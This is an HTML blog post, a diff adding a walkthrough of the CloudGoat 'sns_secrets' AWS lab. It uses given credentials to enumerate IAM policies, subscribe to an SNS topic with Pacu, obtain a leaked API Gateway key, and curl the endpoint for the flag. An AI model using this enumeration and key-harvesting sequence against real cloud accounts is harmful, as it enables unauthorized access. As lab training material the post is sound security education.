@@ -1,0 +1,160 @@
+<!doctype html><html lang=en><head><title>Cloudgoat SNS_Secrets Walkthrou :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="This is a wlakthrou of one of te easy environments provided by cloadgoat project"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/cloudgoat/sns_secrets/sns_secrets/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Cloudgoat SNS_Secrets Walkthrou"><meta property="og:description" content="This is a wlakthrou of one of te easy environments provided by cloadgoat project"><meta property="og:url" content="https://hack.com.cy/writeups/cloudgoat/sns_secrets/sns_secrets/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="Cloud"><meta property="article:section" content="AWS"><meta property="article:published_time" content="2025-08-21 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/cloudgoat/ class=breadcrumb-link>CloudGoat Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/cloudgoat/sns_secrets/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>Cloudgoat SNS_Secrets Walkthrou</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/cloudgoat/sns_secrets/sns_secrets/>Cloudgoat SNS_Secrets Walkthrou</a></h1><div class=post-meta><time class=post-date>2025-08-21&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>4 min read (657 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/awc-cli/>AWC CLI</a>&nbsp;
+#<a href=https://hack.com.cy/tags/pacu/>Pacu</a>&nbsp;
+#<a href=https://hack.com.cy/tags/sns/>SNS</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#awc-cli-profile-creation>AWC CLI profile creation</a></li><li><a href=#iam-enumeration-with-sns-credentials>IAM Enumeration with <code>sns</code> credentials</a></li><li><a href=#sns-enumeration>SNS Enumeration</a></li></ul></nav></div><div class=post-content><div><h1 id=initial-access--credentials>Initial Access / Credentials<a href=#initial-access--credentials class=hanchor arialabel=Anchor>#</a></h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>sns_user_access_key_id</span> <span class=o>=</span> AKIA<span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=nv>sns_user_secret_access_key</span> <span class=o>=</span> <span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span></code></pre></div><h2 id=awc-cli-profile-creation>AWC CLI profile creation<a href=#awc-cli-profile-creation class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws configure --profile sns
+</span></span><span class=line><span class=cl>AWS Access Key ID <span class=o>[</span>None<span class=o>]</span>: AKIA<span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl>AWS Secret Access Key <span class=o>[</span>None<span class=o>]</span>: <span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl>Default region name <span class=o>[</span>None<span class=o>]</span>: us-east-1
+</span></span><span class=line><span class=cl>Default output format <span class=o>[</span>None<span class=o>]</span>: json
+</span></span></code></pre></div><blockquote><p>-Created an aws profile with the credentials given</p></blockquote><h2 id=iam-enumeration-with-sns-credentials>IAM Enumeration with <code>sns</code> credentials<a href=#iam-enumeration-with-sns-credentials class=hanchor arialabel=Anchor>#</a></h2><p><strong>whoami</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws sts get-caller-identity --profile sns                
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQILY3KHBHBA&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Account&#34;</span>: <span class=s2>&#34;289202785296&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cg-sns-user-cgid6j1kvw51kk&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Got username <strong>cg-sns-user-cgid6j1kvw51kk</strong></p></blockquote><p><strong>List Users Roles Policies and Groups</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam list-users --profile sns                                                 
+</span></span><span class=line><span class=cl>aws iam list-roles --profile sns
+</span></span><span class=line><span class=cl>aws iam list-policies --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>aws iam list-groups-for-user --user-name cg-sns-user-cgid6j1kvw51kk --profile sns
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Groups&#34;</span>: <span class=o>[]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>We dont have permission to list users, roles, policies but we did for groups which it seems nothing is there</p></blockquote><p><strong>Lists managed and inline policies for our user</strong></p><p><strong>List managed user policies</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam list-attached-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;AttachedPolicies&#34;</span>: <span class=o>[]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><p><strong>List inline user policies</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam list-user-policies --user-name cg-sns-user-cgid6j1kvw51kk --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyNames&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;cg-sns-user-policy-cgid6j1kvw51kk&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>It seems that we finally found something. Our user has a custom policy attatched to it.</p></blockquote><p><strong>Get user inline policy details</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws iam get-user-policy --user-name cg-sns-user-cgid6j1kvw51kk --policy-name cg-sns-user-policy-cgid6j1kvw51kk --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;UserName&#34;</span>: <span class=s2>&#34;cg-sns-user-cgid6j1kvw51kk&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyName&#34;</span>: <span class=s2>&#34;cg-sns-user-policy-cgid6j1kvw51kk&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyDocument&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>            <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sns:Subscribe&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sns:Receive&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sns:ListSubscriptionsByTopic&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sns:ListTopics&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;sns:GetTopicAttributes&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;iam:ListGroupsForUser&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;iam:ListUserPolicies&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;iam:GetUserPolicy&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;iam:ListAttachedUserPolicies&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;apigateway:GET&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=o>]</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>,
+</span></span><span class=line><span class=cl>            <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Action&#34;</span>: <span class=s2>&#34;apigateway:GET&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Deny&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Resource&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/apikeys&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/apikeys/*&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/restapis/*/methods/GET&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/restapis/*/integration&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=o>]</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Most of the <strong>iam</strong> permissions we already enumerated but it seems we can enumerate more on <strong>sns</strong> and <strong>apigateway</strong></p></blockquote><p>But first&mldr;
+<strong>What is SNS in AWS?</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Amazon Simple Notification Service <span class=o>(</span>Amazon SNS<span class=o>)</span> is a web service that **makes it easy to <span class=nb>set</span> up, operate, and send notifications from the cloud**.
+</span></span></code></pre></div><h2 id=sns-enumeration>SNS Enumeration<a href=#sns-enumeration class=hanchor arialabel=Anchor>#</a></h2><p><strong>Listing SNS Topics</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws sns list-topics --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Topics&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;TopicArn&#34;</span>: <span class=s2>&#34;arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>We got the arn of 1 topic.But lets continue our enumeration and extract all the information we can with the permissions that we have</p></blockquote><p><strong>Get SNS Topic Attributes</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --region us-east-1 --profile sns
+</span></span><span class=line><span class=cl>aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --profile sns
+</span></span></code></pre></div><p><strong>Subscirbe to a SNS Topic</strong></p><p>For this one i used pacu.
+Also to successfully subscribe to an SNS topic we need the <strong>Topic ARN</strong> as well as a <strong>working email</strong>!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>run sns__subscribe --topics arn:aws:sns:us-east-1:289202785296:public-topic-cgid6j1kvw51kk --email dotpirate@dotpirate.rocks
+</span></span></code></pre></div><blockquote><p>After subscribing I recreived an email to which I had to click the link to activate the subscription and right after that I recieved a second email with an API GATEWAY KEY! 45a3da61***********</p></blockquote><p>So what can i do with this key.. Since I am new into this i start googling around about how could I escalate my privileges using the API GATEWAY.
+Additionally, i checked the description of the lab and it says tha we have to query the endpoint to get the flag!
+I found that in order to query the endpoint we need the <strong>api-id</strong>, <strong>region</strong>, <strong>stage</strong> and the <strong>path</strong>
+So lets get those&mldr;</p><p><strong>Enumerating REST APIs</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;items&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;5btvmrrlfi&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;name&#34;</span>: <span class=s2>&#34;cg-api-cgid6j1kvw51kk&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span>: <span class=s2>&#34;API for demonstrating leaked API key scenario&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;createdDate&#34;</span>: <span class=s2>&#34;2025-08-21T07:34:51-05:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;apiKeySource&#34;</span>: <span class=s2>&#34;HEADER&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;endpointConfiguration&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;types&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;EDGE&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=o>]</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;ipAddressType&#34;</span>: <span class=s2>&#34;ipv4&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;tags&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Scenario&#34;</span>: <span class=s2>&#34;iam_privesc_by_key_rotation&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Stack&#34;</span>: <span class=s2>&#34;CloudGoat&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;disableExecuteApiEndpoint&#34;</span>: false,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;rootResourceId&#34;</span>: <span class=s2>&#34;7fezg1k4h5&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span></code></pre></div><blockquote><p>Got the REST api id</p></blockquote><p><strong>Enumerating All Accessible API Endpoints</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws apigateway get-resources  --rest-api-id 5btvmrrlfi --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;items&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;7fezg1k4h5&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;path&#34;</span>: <span class=s2>&#34;/&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;ernlg7&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;parentId&#34;</span>: <span class=s2>&#34;7fezg1k4h5&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;pathPart&#34;</span>: <span class=s2>&#34;user-data&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;path&#34;</span>: <span class=s2>&#34;/user-data&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;resourceMethods&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;GET&#34;</span>: <span class=o>{}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Now we got the path</p></blockquote><p><strong>Finding the stage name</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws apigateway get-resources  --rest-api-id 5btvmrrlfi --profile sns
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;items&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;7fezg1k4h5&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;path&#34;</span>: <span class=s2>&#34;/&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;id&#34;</span>: <span class=s2>&#34;ernlg7&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;parentId&#34;</span>: <span class=s2>&#34;7fezg1k4h5&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;pathPart&#34;</span>: <span class=s2>&#34;user-data&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;path&#34;</span>: <span class=s2>&#34;/user-data&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;resourceMethods&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;GET&#34;</span>: <span class=o>{}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>We got everyhing and we can build the URL!</p></blockquote><p><strong>Putting all together to form the HTTP request</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -v -H <span class=s2>&#34;x-api-key: &lt;your-api-key&gt;&#34;</span> https://&lt;api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage&gt;/flag
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>curl -H <span class=s2>&#34;x-api-key: 45a3d************&#34;</span> <span class=s1>&#39;https://5btvmrrlfi.execute-api.us-east-1.amazonaws.com/prod-cgid6j1kvw51kk/user-data&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;final_flag&#34;</span>:<span class=s2>&#34;FLAG{SNS_S3cr3ts_ar3_FUN}&#34;</span>,<span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Access granted&#34;</span>,<span class=s2>&#34;user_data&#34;</span>:<span class=o>{</span><span class=s2>&#34;email&#34;</span>:<span class=s2>&#34;SuperAdmin@notarealemail.com&#34;</span>,<span class=s2>&#34;password&#34;</span>:<span class=s2>&#34;p@ssw0rd123&#34;</span>,<span class=s2>&#34;user_id&#34;</span>:<span class=s2>&#34;1337&#34;</span>,<span class=s2>&#34;username&#34;</span>:<span class=s2>&#34;SuperAdmin&#34;</span><span class=o>}}</span>
+</span></span></code></pre></div></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
+<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>
